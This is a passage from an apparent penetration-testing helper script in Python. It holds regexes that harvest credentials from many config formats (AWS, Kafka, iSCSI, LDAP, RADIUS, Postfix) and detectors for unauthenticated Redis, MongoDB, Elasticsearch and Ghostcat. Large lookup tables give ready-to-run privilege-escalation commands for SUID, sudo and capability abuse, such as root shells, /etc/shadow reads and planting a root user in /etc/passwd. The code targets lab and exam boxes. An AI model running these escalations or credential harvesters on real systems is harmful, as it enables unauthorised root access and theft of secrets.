    r'(?:(?!\n\s*\[)[\s\S]){0,300}?'
    r'^\s*password\s*[:=]\s*([^\s#\r\n]{3,200})\s*(?:\r?\n|$)'
)

# iter-195: iSCSI initiator config (/etc/iscsi/iscsid.conf) and per-node
# config files under /etc/iscsi/nodes/. Format is INI-like:
#   node.session.auth.authmethod = CHAP
#   node.session.auth.username = target-init
#   node.session.auth.password = MyStrongP@ss2024
# Also `discovery.sendtargets.auth.username/password` for target discovery.
# Multi-line: username and password rows can be separated by other options.
_ISCSI_AUTH = re.compile(
    r'(?im)^\s*(node|discovery)\.[a-z_]+\.auth\.username(?:_in)?\s*=\s*'
    r'([^\s#\r\n]{1,80})\s*(?:#[^\r\n]*)?\s*\n'
    r'(?:(?!\n\s*(?:node|discovery)\.[a-z_]+\.auth\.username)[\s\S]){0,400}?'
    r'^\s*(?:node|discovery)\.[a-z_]+\.auth\.password(?:_in)?\s*=\s*'
    r'([^\s#\r\n]{3,80})\s*(?:#[^\r\n]*)?\s*$'
)

# iter-195: Elasticsearch config plaintext passwords. `elasticsearch.yml`
# / `kibana.yml` / `logstash.yml` / `apm-server.yml` all use the same
# YAML shape with dotted-key or nested-object forms. Plaintext passwords
# most commonly appear on:
#   xpack.security.transport.ssl.keystore.password: X
#   xpack.security.http.ssl.keystore.password: X
#   xpack.security.authc.realms.native.native1.order: X
#   elastic.password: X                                (Kibana / bootstrap)
#   elasticsearch.password: X                          (Kibana)
#   xpack.reporting.encryptionKey: X
_ES_XPACK_PW = re.compile(
    r'(?im)^\s*'
    r'((?:xpack\.[a-z._]+\.(?:password|encryption[_-]?key|secret[_-]?key)|'
    r'elasticsearch\.password|elastic(?:\.username|\.password)?|'
    r'kibana\.password|logstash\.password))'
    r'\s*:\s*["\']?([^"\'\s#\r\n]{3,120})["\']?\s*(?:#[^\r\n]*)?$'
)

# iter-192: PPP chap-secrets / pap-secrets file.
# `/etc/ppp/chap-secrets` and `/etc/ppp/pap-secrets` format:
#   # client   server   secret               IP addresses
#   alice      *        "MyP@ss2024"         192.168.1.10
#   bob        vpn01    AnotherPass          *
# Very common on VPN gateway / RADIUS-fronted lab boxes. Secret can be
# quoted OR unquoted (bare token).
_PPP_SECRETS = re.compile(
    r'(?m)^([a-zA-Z_][a-zA-Z0-9._@\\/-]{0,60})\s+'
    r'(\S+)\s+'
    r'(?:"([^"\r\n]{3,80})"|([^\s#"\r\n]{3,80}))'
    r'(?:\s+([^\s#\r\n]+))?\s*(?:#[^\r\n]*)?$'
)

# iter-190: AWS credentials INI block. Standard file ~/.aws/credentials or
# ~/.aws/config; also fires in `[default]` / `[profile <name>]` embedded
# in .env dumps, gitleaks findings, etc. Multi-line - the profile header,
# key ID and secret key can be spread across 3 lines with blank lines and
# comments between them.
#   [staging]
#   aws_access_key_id = AKIAIOSFODNN7EXAMPLE
#   aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
#   aws_session_token = FQoGZXIvYXdzEJ...      (optional)
# Groups: 1 = profile, 2 = access key ID, 3 = secret key. The middle-span
# lookahead `(?:(?!\n\s*\[)[\s\S])` prevents bleed across profiles - a
# fresh `[header]` between the profile row and the secret means we walked
# past a sibling profile (whose secret is malformed) and are pairing this
# profile's header with the NEXT profile's secret.
_AWS_CREDS_INI = re.compile(
    r'(?im)^\s*\[(?:profile\s+)?([\w.-]{1,60})\]\s*\r?\n'
    r'(?:(?!\n\s*\[)[\s\S]){0,400}?'
    r'^\s*aws_access_key_id\s*[:=]\s*(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})\s*\r?\n'
    r'(?:(?!\n\s*\[)[\s\S]){0,400}?'
    r'^\s*aws_secret_access_key\s*[:=]\s*([A-Za-z0-9/+=]{40})\s*(?:\r?\n|$)'
)

# iter-191: Kafka SASL PLAIN / SCRAM JAAS config. Common in
# `server.properties`, `client.properties`, `consumer.properties`,
# `producer.properties`, and Spring Boot application.yaml with a
# `spring.kafka.properties.sasl.jaas.config` key. Shape:
#   sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule \
#     required username="alice" password="MyPassword123";
# Both PLAIN + SCRAM login modules use the same username/password fields.
# The multi-line span accommodates backslash-continued or newline-broken
# JAAS entries.
_KAFKA_JAAS = re.compile(
    r'(?i)(?:Plain|Scram(?:Sha(?:256|512)?)?)LoginModule\s+required'
    r'[\s\S]{0,200}?'
    r'username\s*=\s*["\']([^"\']{1,60})["\']'
    r'[\s\S]{0,200}?'
    r'password\s*=\s*["\']([^"\']{3,80})["\']'
)

# iter-191: Windows Task Scheduler XML export. `schtasks /query /XML` OR
# `Export-ScheduledTask` produces XML containing:
#   <Principals>
#     <Principal id="Author">
#       <UserId>CORP\svc-backup</UserId>
#       <LogonType>Password</LogonType>
# The password itself isn't in the XML (DPAPI-encrypted in the SCM store),
# but the pairing signals: (a) a service account exists, and (b) it uses a
# stored password (not S4U / GroupManaged). Feed to RECON so downstream
# can prioritise credential-theft on that account. Also captures
# InteractiveTokenOrPassword variants.
_TASK_SCHED_XML = re.compile(
    r'(?i)<UserId>([^<>\r\n]{2,80})</UserId>'
    r'[\s\S]{0,300}?'
    r'<LogonType>(Password|InteractiveTokenOrPassword|S4U)</LogonType>'
)

# iter-215: Per-binary escape lookup tables consulted by the existing
# SUID GTFOBins / sudo NOPASSWD / Linux capability emit sites so the
# operator gets a specific copy-paste-able escape command instead of a
# generic "check GTFOBins for the binary" hint. Covers the top ~60
# binaries seen on OSCP+ retired-lab boxes.
#
# NOTE: escapes use `-p` (retain SUID) for SUID paths and drop `-p`
# for sudo paths because sudo already re-elevates to the target user.
_GTFOBINS_SUID = {
    # Shells - direct
    "bash": "./bash -p",
    "sh": "./sh -p",
    "dash": "./dash -p",
    "ash": "./ash -p",
    "zsh": "./zsh -p",
    "csh": "./csh -p",
    "ksh": "./ksh -p",
    # Interpreters
    "python": "./python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
    "python2": "./python2 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
    "python3": "./python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
    "perl": "./perl -e 'exec \"/bin/sh\",\"-p\";'",
    "ruby": "./ruby -e 'exec \"/bin/sh\",\"-p\"'",
    "php": "./php -r \"pcntl_exec('/bin/sh',['-p']);\"",
    "node": "./node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'",
    "lua": "./lua -e 'os.execute(\"/bin/sh -p\")'",
    "tclsh": "./tclsh <<< 'exec /bin/sh -p <@stdin >@stdout 2>@stderr'",
    "expect": "./expect -c 'spawn /bin/sh -p; interact'",
    "awk": "./awk 'BEGIN {system(\"/bin/sh -p\")}'",
    "gawk": "./gawk 'BEGIN {system(\"/bin/sh -p\")}'",
    "mawk": "./mawk 'BEGIN {system(\"/bin/sh -p\")}'",
    # Text/edit tools
    "vim": "./vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
    "vi": "./vi -c ':!/bin/sh -p'",
    "view": "./view -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
    "rvim": "./rvim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
    "vimdiff": "./vimdiff -c ':!/bin/sh -p'",
    "less": "./less /etc/profile then !/bin/sh -p",
    "more": "./more /etc/profile then !/bin/sh -p",
    "nano": "./nano then ^R^X then 'reset; sh 1>&0 2>&0'",
    "emacs": "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'",
    "ed": "./ed then !/bin/sh -p",
    "ex": "./ex then !/bin/sh -p",
    "sed": "./sed -e '' /etc/shadow reads shadow as SUID user",
    # Utilities
    "find": "./find . -exec /bin/sh -p \\\\; -quit",
    "nmap": "./nmap --interactive then !sh (old nmap only)",
    "env": "./env /bin/sh -p",
    "socat": "./socat stdin exec:'/bin/sh -p'",
    "gdb": "./gdb -nx -ex '!/bin/sh -p' -ex quit",
    "gcc": "./gcc -wrapper /bin/sh,-s .",
    "make": "COMMAND='/bin/sh'; ./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"''",
    "screen": "./screen -h - then :exec !!bash",
    "tmux": "./tmux new-session '/bin/sh -p'",
    "git": "./git help config then !/bin/sh -p",
    "smbclient": "./smbclient //x/y then !/bin/sh -p",
    "ftp": "./ftp then !/bin/sh -p",
    "sftp": "./sftp -o AuthenticationMethods=none x@y then !/bin/sh -p",
    # Read/write primitives
    "cat": "./cat /etc/shadow reads shadow file",
    "tac": "./tac /etc/shadow reads shadow (reversed)",
    "head": "./head -n 999 /etc/shadow",
    "tail": "./tail -n 999 /etc/shadow",
    "cp": "./cp /bin/bash /tmp/rsh; ./chmod +s /tmp/rsh (chain)",
    "chmod": "./chmod +s /bin/bash",
    "chown": "./chown $(id -u):$(id -g) /etc/shadow",
    "dd": "echo 'evil:x:0:0::/root:/bin/bash' | ./dd of=/etc/passwd",
    "tee": "echo 'evil:x:0:0::/root:/bin/bash' | ./tee -a /etc/passwd",
    "tar": ("./tar -cf /dev/null /dev/null --checkpoint=1 "
             "--checkpoint-action=exec='/bin/sh -p'"),
    "zip": ("TF=$(mktemp -u); ./zip $TF /etc/hosts -T "
             "--unzip-command='sh -c /bin/sh -p'"),
    "unzip": ("./unzip -o -x -d /root/.ssh/ malicious.zip "
              "(overwrites authorized_keys)"),
    # Wrappers
    "flock": "./flock -u /tmp/x /bin/sh -p",
    "time": "./time /bin/sh -p",
    "timeout": "./timeout 7d /bin/sh -p",
    "stdbuf": "./stdbuf -i0 /bin/sh -p",
    "nice": "./nice /bin/sh -p",
    "nohup": "./nohup /bin/sh -p",
    "taskset": "./taskset 1 /bin/sh -p",
    "setarch": "./setarch $(arch) /bin/sh -p",
    "chroot": "./chroot / /bin/sh -p",
    # Pkg managers (rarely SUID but included)
    "apt": "./apt update -o APT::Update::Pre-Invoke::='/bin/sh -p'",
    "apt-get": "./apt-get update -o APT::Update::Pre-Invoke::='/bin/sh -p'",
    "dpkg": "./dpkg -i <malicious.deb with postinst=/bin/sh -p>",
    "pip": ("TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"
             " > $TF/setup.py; ./pip install $TF"),
    "pip3": ("TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"
              " > $TF/setup.py; ./pip3 install $TF"),
    "yum": "./yum shell then \"run install ./malicious.rpm\"",
    "dnf": "./dnf install ./malicious.rpm",
    "apk": "./apk add --allow-untrusted ./malicious.apk",
    # Others
    "docker": "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "openssl": "./openssl req -engine /tmp/malicious.so (payload writes /etc/passwd)",
    "sudoedit": "CVE-2021-3156 Baron Samedit (chain: sudoedit -s ' \\\\')",
    "pkexec": "CVE-2021-4034 PwnKit - any user to root even without SUID",
    "systemctl": "./systemctl link /tmp/evil.service; ./systemctl start evil",
    "service": "./service ../../../../../tmp/evil (path escape)",
    "crontab": "./crontab -e (spawn EDITOR as root)",
    "at": "echo '/bin/sh -p' | ./at now",
    "mount": "./mount -o rw,remount /  (needs cap_sys_admin usually)",
    "busybox": "./busybox sh -p",
    "iptables": "./iptables --modprobe='/bin/sh -p' -L",
    "ip": "./ip vrf exec default /bin/sh -p",
    "watch": "./watch -x /bin/sh -p -c 'sh 0<&2 1>&2'",
    "xargs": "echo | ./xargs -a /dev/null sh -p",
    "strace": "./strace -o /dev/null /bin/sh -p",
    "ltrace": "./ltrace -e nothing /bin/sh -p",
    "wget": "./wget --use-askpass=/bin/sh -p /  (or --post-file=/etc/shadow)",
    "curl": "./curl file:///etc/shadow reads shadow",
    "iconv": "./iconv -f 8859_1 -t 8859_1 /etc/shadow reads shadow",
    "xz": "LFILE=/etc/shadow; ./xz -c $LFILE | xz -d reads shadow",
    "column": "./column -e /etc/shadow reads shadow",
    "jq": "./jq -Rr . /etc/shadow reads shadow",
    "nl": "./nl -bn /etc/shadow reads shadow",
    "paste": "./paste /etc/shadow reads shadow",
    "strings": "./strings /etc/shadow reads shadow",
    "readelf": "./readelf -a /etc/shadow (may leak partial)",
    "objdump": "./objdump -a /etc/shadow (may leak partial)",
    "xxd": "./xxd /etc/shadow reads shadow (hex)",
    "sudo": "may be exploitable via CVE-2019-14287 (-u#-1) or 3156",
    "rsync": "./rsync -e '/bin/sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/tmp/",
    "wall": "./wall broadcasts a message; low value alone",
}

# Sudo NOPASSWD escapes - launched as `sudo <bin>`. Similar to SUID but
# no `-p` needed since sudo re-elevates to root explicitly.
_GTFOBINS_SUDO = {
    "bash": "sudo bash",
    "sh": "sudo sh",
    "dash": "sudo dash",
    "ash": "sudo ash",
    "zsh": "sudo zsh",
    "python": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
    "python2": "sudo python2 -c 'import os; os.system(\"/bin/sh\")'",
    "python3": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
    "perl": "sudo perl -e 'exec \"/bin/sh\";'",
    "ruby": "sudo ruby -e 'exec \"/bin/sh\"'",
    "php": "sudo php -r \"system('/bin/sh');\"",
    "node": ("sudo node -e "
              "'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"),
    "lua": "sudo lua -e 'os.execute(\"/bin/sh\")'",
    "expect": "sudo expect -c 'spawn /bin/sh; interact'",
    "awk": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    "gawk": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'",
    "vim": "sudo vim -c ':!/bin/sh'",
    "vi": "sudo vi then :!/bin/sh",
    "view": "sudo view then :!/bin/sh",
    "less": "sudo less /etc/profile then !/bin/sh",
    "more": "sudo more /etc/profile then !/bin/sh",
    "nano": "sudo nano then ^R^X then 'reset; sh 1>&0 2>&0'",
    "emacs": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'",
    "ed": "sudo ed then !/bin/sh",
    "ex": "sudo ex '+shell'",
    "find": "sudo find . -exec /bin/sh \\\\; -quit",
    "nmap": ("sudo nmap --interactive then !sh (old); new: "
              "echo 'os.execute(\"/bin/sh\")' > /tmp/e.nse; sudo nmap "
              "--script=/tmp/e.nse"),
    "env": "sudo env /bin/sh",
    "git": "sudo git -p help config then !/bin/sh",
    "gdb": "sudo gdb -nx -ex '!/bin/sh' -ex quit",
    "gcc": "sudo gcc -wrapper /bin/sh,-s .",
    "make": "sudo make -s --eval=$'x:\\n\\t-/bin/sh'",
    "screen": "sudo screen then Ctrl-a :exec !! bash",
    "tmux": "sudo tmux new-session '/bin/sh'",
    "socat": "sudo socat stdin exec:/bin/sh",
    "apt": ("sudo apt update -o "
              "APT::Update::Pre-Invoke::='/bin/sh'"),
    "apt-get": ("sudo apt-get update -o "
                  "APT::Update::Pre-Invoke::='/bin/sh'"),
    "dpkg": "sudo dpkg -i <malicious.deb with postinst>",
    "pip": ("TF=$(mktemp -d); echo 'import os; os.system(\"/bin/sh\")' > "
             "$TF/setup.py; sudo pip install $TF"),
    "pip3": ("TF=$(mktemp -d); echo 'import os; os.system(\"/bin/sh\")' > "
              "$TF/setup.py; sudo pip3 install $TF"),
    "yum": "sudo yum shell then \"run install ./malicious.rpm\"",
    "dnf": "sudo dnf install ./malicious.rpm",
    "rpm": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
    "apk": "sudo apk add --allow-untrusted ./malicious.apk",
    "docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "systemctl": ("sudo systemctl link /tmp/evil.service; "
                    "sudo systemctl start evil  |  or systemctl edit "
                    "--full <unit>"),
    "service": "sudo service ../../../../tmp/evil (path escape)",
    "crontab": "sudo crontab -e (spawn EDITOR as root)",
    "at": "echo '/bin/sh' | sudo at now",
    "openssl": "sudo openssl enc -in /etc/shadow (read-only bypass)",
    "wget": "sudo wget --use-askpass=/bin/sh /",
    "curl": "sudo curl file:///etc/shadow (read) OR -o /etc/... (overwrite)",
    "tar": ("sudo tar -cf /dev/null /dev/null --checkpoint=1 "
             "--checkpoint-action=exec='/bin/sh'"),
    "zip": ("TF=$(mktemp -u); sudo zip $TF /etc/hosts -T "
             "--unzip-command='sh -c /bin/sh'"),
    "chmod": "sudo chmod +s /bin/bash",
    "chown": "sudo chown $(id -u):$(id -g) /etc/shadow",
    "dd": "echo 'evil:x:0:0::/root:/bin/bash' | sudo dd of=/etc/passwd",
    "tee": "echo 'evil:x:0:0::/root:/bin/bash' | sudo tee -a /etc/passwd",
    "cp": "sudo cp <shell-elf> /usr/local/bin/getroot",
    "mv": "sudo mv <shell-elf> /usr/local/bin/getroot",
    "rsync": "sudo rsync -e '/bin/sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/",
    "mount": "sudo mount -o bind /bin/sh /bin/false (custom binding)",
    "strace": "sudo strace -o /dev/null /bin/sh",
    "ltrace": "sudo ltrace -e nothing /bin/sh",
    "ftp": "sudo ftp then !/bin/sh",
    "sftp": "sudo sftp -o AuthenticationMethods=none x@y then !/bin/sh",
    "smbclient": "sudo smbclient //x/y then !/bin/sh",
    "xargs": "echo | sudo xargs -a /dev/null sh",
    "flock": "sudo flock -u /tmp/x /bin/sh",
    "time": "sudo time /bin/sh",
    "timeout": "sudo timeout 7d /bin/sh",
    "stdbuf": "sudo stdbuf -i0 /bin/sh",
    "nice": "sudo nice /bin/sh",
    "nohup": "sudo nohup /bin/sh",
    "taskset": "sudo taskset 1 /bin/sh",
    "setarch": "sudo setarch $(arch) /bin/sh",
    "chroot": "sudo chroot / /bin/sh",
    "watch": "sudo watch -x /bin/sh -c 'sh 0<&2 1>&2'",
    "ip": "sudo ip vrf exec default /bin/sh (Linux 4.4+)",
    "iptables": "sudo iptables --modprobe='/bin/sh' -L",
    "busybox": "sudo busybox sh",
    "sed": "sudo sed -e '' /etc/shadow reads shadow",
    "cat": "sudo cat /etc/shadow",
    "tac": "sudo tac /etc/shadow",
    "head": "sudo head -n 999 /etc/shadow",
    "tail": "sudo tail -n 999 /etc/shadow",
    "iconv": "sudo iconv -f 8859_1 -t 8859_1 /etc/shadow",
    "xz": "sudo xz -c /etc/shadow | xz -d",
    "column": "sudo column -e /etc/shadow",
    "jq": "sudo jq -Rr . /etc/shadow",
    "nl": "sudo nl -bn /etc/shadow",
    "paste": "sudo paste /etc/shadow",
    "strings": "sudo strings /etc/shadow",
    "readelf": "sudo readelf -a /etc/shadow",
    "objdump": "sudo objdump -a /etc/shadow",
    "xxd": "sudo xxd /etc/shadow",
    "pkexec": "sudo pkexec /bin/sh",
    "sudoedit": "sudoedit CVE-2021-3156 Baron Samedit if pre-1.9.5p2",
    "ansible-playbook": ("sudo ansible-playbook /dev/stdin <<< $'- "
                          "hosts: localhost\\n  tasks:\\n  - shell: "
                          "/bin/sh'"),
    "wall": "sudo wall (broadcasts; low value alone)",
}

# Linux capability escape hints keyed on capability name.
_LINUX_CAPS = {
    "cap_setuid": ("<bin> -c 'import os; os.setuid(0); "
                    "os.system(\"/bin/sh\")' (python/perl/ruby); "
                    "direct root"),
    "cap_setgid": ("<bin> -c 'import os; os.setgid(0); "
                    "os.system(\"/bin/sh\")' - root gid; combine with "
                    "cap_setuid for full root"),
    "cap_dac_read_search": ("bypass file-read DAC - `<bin> "
                             "/etc/shadow` reads any file as non-root"),
    "cap_dac_override": ("bypass file-write DAC - `<bin> -c "
                          "'open(\"/etc/passwd\",\"w\").write(EVIL)'` "
                          "writes protected files"),
    "cap_sys_admin": ("near-root - mount any device, `mount -o bind / "
                       "/mnt`, remount rw, etc"),
    "cap_sys_ptrace": ("attach to any process - inject shellcode "
                        "via `<bin> -p <root-pid>` (ptrace-injector.py)"),
    "cap_sys_module": ("load kernel modules - `insmod evil.ko` as "
                        "non-root -> kernel-space RCE"),
    "cap_sys_chroot": "chroot escape via double-chroot trick",
    "cap_chown": ("chown any file - `<bin>` can chown /etc/shadow to "
                   "your uid then read"),
    "cap_fowner": "bypass fowner check - chmod any file",
    "cap_kill": ("SIGKILL any process (incl. root daemons); "
                  "shutdown auth for reset attack"),
    "cap_net_raw": ("raw sockets - packet sniffing / ARP spoof; "
                     "extract creds off the wire"),
    "cap_net_bind_service": "bind low ports without root (e.g., DNS spoof)",
    "cap_net_admin": "manage networking - iptables/nftables/tc control",
    "cap_sys_time": ("change system time - may bypass ticket expiry "
                      "or lockout counters"),
    "cap_audit_control": "audit config - low value alone",
}


# iter-207: Postfix SMTP relay auth (/etc/postfix/sasl_passwd).
# Format: `[relay-host]:port user:password`  OR  `[host] user:pw`.
# Common on Linux mail-relay lab boxes (HTB Bart / Reel / mail-forwarding).
# Filename-gated at dispatch to avoid matching `[host]:port user:tag` in
# nmap output.
_POSTFIX_SASL = re.compile(
    # iter-222 audit fix: extend host char-class to `:` so bracketed
    # IPv6 relays `[2001:db8::1]:587` match. IPv6 hosts inside `[...]`
    # brackets can't collide with the port separator because the port
    # sits OUTSIDE the brackets in the sasl_passwd format.
    r'(?m)^\s*\[([\w.:\-]+)\](?::(\d{1,5}))?\s+'
    r'([^\s:@]{1,60})(?:@[\w.\-]+)?:'
    r'([^\s#\r\n]{3,80})\s*$'
)

# iter-207: OpenLDAP admin credential in slapd.conf (`rootpw <value>`) OR
# cn=config LDIF (`olcRootPW: <value>`). Value can be cleartext or a
# {SSHA}base64 / {CRYPT}$6$... hash. Very common on OpenLDAP-backed lab
# boxes (TryHackMe LDAP labs, INE eJPT Directory Services labs).
# Two shapes because slapd.conf uses whitespace and LDIF uses `:` / `::`.
_LDAP_ROOTPW = re.compile(
    r'(?im)^\s*(?:rootpw|olcRootPW)\s*(::?|\s+)\s*'
    r'([^\s#\r\n]{3,200})\s*$'
)

# iter-208: Dovecot passwd-file passdb (IMAP/POP3 mailbox creds).
# Format: `user:{SCHEME}hash_or_pw[:uid:gid:home:shell:extra]`. Common on
# Linux mail lab boxes (HTB Popcorn/Mail forwarding, THM Overpass mail).
# Also captures plaintext (no `{SCHEME}` prefix, defaults to configured
# default_pass_scheme which is often PLAIN on tutorials). Filename-gated
# at dispatch to prevent FP on `/etc/passwd` and generic `user:hash` logs.
_DOVECOT_PASSWD = re.compile(
    r'(?m)^([\w.\-]{1,40}(?:@[\w.\-]{1,60})?):'
    r'(\{[A-Z0-9\-.]{2,32}\})?'
    r'([^\s:][^\r\n:]{2,200})'
    r'(?::\d{1,10}:\d{1,10}(?::[^\r\n]{0,300})?)?\s*$'
)

# iter-209: FreeRADIUS clients.conf shared secret. Format:
#   client <name> {
#       ipaddr = ...
#       secret = <shared-secret>
#       ...
#   }
# Shared secrets are the RADIUS network-auth pivot - APs, switches,
# firewalls, VPN concentrators all use this exact string to auth against
# the RADIUS server; frequently reused as the wifi/console admin password
# on lab boxes (THM Enterprise, HTB corporate RADIUS labs).
# Bounded `.{0,500}?` between `client` block start and `secret` to prevent
# catastrophic backtracking; a real client block is well under that.
_RADIUS_CLIENT = re.compile(
    r'(?is)\bclient\s+([^\s{]{1,60})\s*\{'
    r'[^{}]{0,500}?'
    r'\bsecret\s*=\s*[\'"]?([^\'"\s#\r\n]{3,80})[\'"]?'
)

# iter-210: Redis 6379 UNAUTH banner - `redis_version:` in captured output
# indicates INFO command returned without an auth challenge, confirming
# the target Redis accepts unauth commands. The canonical OSCP+ redis
# foothold: unauth INFO → CONFIG SET dir + dbfilename → SET ssh key →
# SAVE → ssh redis@<host> (or drop a webshell into /var/www/html/).
# Also matches redis-cli prompt `<host>:<port>>` which only appears after
# a successful connect - even without INFO, having the prompt confirms
# unauth or at-least ACL-list-accessible.
_REDIS_UNAUTH_INFO = re.compile(
    r'(?im)^\s*redis_version\s*:\s*(\d+\.\d+(?:\.\d+)?)'
)
# `<host_or_ip>:<port>>` interactive prompt. Bounded host chars to
# reduce FP on generic `x:y>` shapes.
_REDIS_CLI_PROMPT = re.compile(
    r'(?m)^([\w\-.]{1,60}):(\d{2,5})>\s'
)

# iter-211: MongoDB 27017 UNAUTH scan/loot capture. Signals:
#   (A) `show dbs` output rows like `admin  0.000GB` - only appears when
#       unauth `show dbs` succeeded (auth'd shell needs `use admin` +
#       auth first).
#   (B) `MongoDB shell version v<X>` banner + a `>` prompt following.
#   (C) `db.version()` returned a real semver like `"4.4.6"`.
# Anti-signals in same file → skip:
#   * `not authorized on <db>` (mongo auth error)
#   * `Authentication failed`
#   * `requires authentication`
_MONGO_SHOW_DBS_ROW = re.compile(
    r'(?im)^\s*(admin|local|config)\s+'
    r'(\d+(?:\.\d+)?)\s*(?:B|KB|MB|GB|TB)\s*$'
)
_MONGO_SHELL_BANNER = re.compile(
    r'(?im)MongoDB\s+shell\s+version\s+v?(\d+\.\d+(?:\.\d+)?)'
)
_MONGO_DB_VERSION = re.compile(
    r'(?is)>\s*db\.version\s*\(\s*\)\s*[\r\n]+'
    r'\s*["\']?(\d+\.\d+(?:\.\d+)?)["\']?'
)

# iter-212: Elasticsearch 9200 UNAUTH REST API banner. The tagline
# "You Know, for Search" is Elasticsearch's dispositive fingerprint -
# GET / returns it in the JSON body when no auth is required. Captured
# curl output showing this = confirmed unauth API access, which unlocks:
#   * dump indices via _cat/indices + _search
#   * CVE-2015-1427 Groovy sandbox escape (ES <1.4.3) for RCE
#   * CVE-2014-3120 MVEL scripting RCE (ES <1.2)
_ES_UNAUTH_TAGLINE = re.compile(
    r'"tagline"\s*:\s*"You Know, for Search"'
)
# Version number from the same banner - `"number":"7.10.2"`.
_ES_VERSION_NUMBER = re.compile(
    r'"number"\s*:\s*"(\d+\.\d+(?:\.\d+)?)"'
)
# _cat/indices output row shape: `<health> <status> <index> <uuid> ...`
# where health is green/yellow/red and status is open/close.
_ES_CAT_INDICES = re.compile(
    r'(?m)^\s*(green|yellow|red)\s+(open|close)\s+([\w.\-]{1,80})\s+'
    r'([\w\-]{4,32})\s+\d+\s+\d+\s+\d+'
)

# iter-213: AJP Ghostcat (CVE-2020-1938) - Apache Tomcat AJP connector
# on port 8009 is exploitable for LFI + RCE on all Tomcat 6/7/8/9 up
# to 9.0.31 / 8.5.51 / 7.0.100 / 6.0.53. The AJP protocol has no
# authentication of its own, so any 8009/tcp open + AJP13 = exam-legal
# manual exploit path. Two dispositive signals:
#
# Signal (A): `Apache Jserv (Protocol v1.3)` - the nmap service scan
# fingerprint when it identifies Tomcat's AJP connector. Cannot appear
# outside AJP scan output.
#
# Signal (B): `8009/tcp open ajp13` - port+service alone, weaker (a
# firewalled port could also show this), but dispositive when combined
# with the port number.
_AJP_JSERV = re.compile(
    r'(?i)Apache\s+Jserv\s*\(\s*Protocol\s+v?1\.3\s*\)'
)
_AJP_PORT_LINE = re.compile(
    r'(?im)^\s*8009/tcp\s+open\s+ajp'
)
# gnmap-style row: `Host: <ip> ... 8009/open/tcp//ajp13//Apache Jserv/`
_AJP_GNMAP = re.compile(
    r'(?i)Host:\s+([\w.:]+)[^\r\n]*8009/open/tcp//ajp13?/'
)

# iter-235: CMS version-banner fingerprints - WordPress / Joomla /
# Drupal. Each with a per-CMS enum tool hint that's exam-legal
# (wpscan without brute, joomscan, droopescan).
#
# WordPress version signals:
#   * <meta name="generator" content="WordPress 5.7.2" />
#   * ?ver=5.7.2 query string on /wp-includes/js/... resources
#   * /wp-content/ or /wp-admin/ path presence
_WORDPRESS_META = re.compile(
    r'(?i)<meta\s+name\s*=\s*[\'"]generator[\'"]\s+content\s*=\s*'
    r'[\'"]WordPress\s+(\d+\.\d+(?:\.\d+)?)'
)
_WORDPRESS_QUERY_VER = re.compile(
    # iter-237 audit fix: /wp-content/ theme/plugin resources have
    # THEIR OWN ?ver= that reports the theme/plugin version, NOT
    # WordPress core. Restricted to /wp-includes/ (core JS/CSS)
    # + /wp-admin/ (also core) so ?ver= reliably reflects the core.
    r'(?i)/wp-(?:includes|admin)/[^\s\'"?]*\?ver=(\d+\.\d+(?:\.\d+)?)'
)
_WORDPRESS_PATH = re.compile(
    # iter-237 audit fix: prior regex forced trailing `/` on ALL
    # alternatives, so `GET /wp-login.php HTTP/1.1` (the canonical
    # request line) never matched. Split per-alternative: wp-admin
    # + wp-content need `/` after; wp-login.php just needs
    # whitespace / query / end.
    # iter-242 audit fix: `wp-login.php` lookahead was too narrow -
    # rejected `"`, `'`, `<`, `#`, `)` etc so HTML `href="..."`
    # references and JSON strings missed. Widened to any non-word
    # boundary: whitespace, quote, angle bracket, paren, ampersand,
    # question mark, hash, end-of-string, or capital letter (HTTP
    # verb). Word-char (letter/digit) as next char = something like
    # `wp-login.php.bak` and is correctly rejected.
    r'(?i)(?:https?://[^/\s]+)?/'
    r'(?:wp-admin/|wp-content/(?:plugins|themes|uploads)/|'
    r'wp-login\.php(?=[\s?&"\'<>#)]|$|[A-Z]))'
)

# Joomla version signals:
#   * <meta name="generator" content="Joomla! - Open Source ..." />
#   * X-Content-Encoded-By: Joomla! X.Y
#   * /administrator/ path with Joomla login shape
_JOOMLA_META = re.compile(
    r'(?i)<meta\s+name\s*=\s*[\'"]generator[\'"]\s+content\s*=\s*'
    r'[\'"]Joomla!(?:\s*-\s*[^\'"]{0,200})?'
    r'[\'"]'
)
_JOOMLA_VERSION = re.compile(
    r'(?i)Joomla!\s*(?:CMS|Version|)\s*(\d+\.\d+(?:\.\d+)?)'
)
_JOOMLA_HEADER = re.compile(
    r'(?im)^X-Content-Encoded-By\s*:\s*Joomla!?\s*(\d+\.\d+(?:\.\d+)?)?'
)

# Drupal version signals (complements iter-22's pre-7.59/8.5.1
# payload-oriented detector):
#   * <meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
#   * X-Generator: Drupal 9 (https://www.drupal.org)
#   * Drupal.settings JS presence
_DRUPAL_HEADER = re.compile(
